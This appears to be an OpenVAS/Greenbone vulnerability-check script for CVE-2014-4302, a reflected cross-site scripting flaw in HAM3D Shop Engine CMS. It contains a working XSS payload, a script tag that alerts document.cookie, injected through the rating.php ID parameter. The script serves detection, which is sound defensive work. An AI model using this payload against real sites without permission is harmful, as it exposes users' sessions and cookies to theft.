# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804652");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2014-4302");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2014-07-04 12:41:22 +0530 (Fri, 04 Jul 2014)");
  script_name("HAM3D Shop Engine CMS 'ID' Parameter Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"HAM3D Shop Engine CMS is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request and check whether it is able to read
  cookie or not.");

  script_tag(name:"insight", value:"Input passed via the HTTP GET parameter 'ID' to rating.php
  script is not properly sanitised before returning to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"HAM3D Shop Engine CMS.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127050");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/68115");
  script_xref(name:"URL", value:"http://www.zerodaylab.com/vulnerabilities/CVE-2014/CVE-2014-4302.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

cmsPort = http_get_port(default:80);

if(!http_can_host_php(port:cmsPort)){
  exit(0);
}

foreach dir (make_list_unique("/", "/cms", "/HAM3D-CMS", http_cgi_dirs(port:cmsPort)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item:string(dir, "/index.php"), port:cmsPort);

  if(res && "HAM3D.net Shop Engine" >< res && "HAM3D.net<" >< res)
  {
    url = dir + '/rating/rating.php?ID="><script>alert(document.cookie' +
                ');</script>';

    if(http_vuln_check(port:cmsPort, url:url, check_header:TRUE,
       pattern:"<script>alert\(document\.cookie\);</script>",
       extra_check:'Rating Bars<'))
    {
      report = http_report_vuln_url( port:cmsPort, url:url );
      security_message(port:cmsPort, data:report);
      exit(0);
    }
  }
}

exit(99);
